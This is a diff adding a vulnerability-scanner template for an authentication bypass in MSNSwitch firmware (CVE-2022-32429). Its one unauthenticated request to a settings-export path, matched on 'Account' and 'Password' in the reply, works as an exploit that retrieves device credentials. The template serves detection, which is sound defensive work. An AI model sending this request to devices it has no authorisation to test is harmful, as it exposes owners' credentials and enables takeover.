@@ -1,0 +1,24 @@
+id: msnswitch-authentication-bypass
+info:
+  name: MSNSwitch Firmware Authentication Bypass (CVE-2022-32429)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: unauthorized-access,cve-2022-32429
+http:
+  - method: GET
+    path:
+      - "/cgi-bin-hax/ExportSettings.sh"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Account"
+          - "Password"
+      - type: word
+        part: header
+        words:
+          - "Settings"
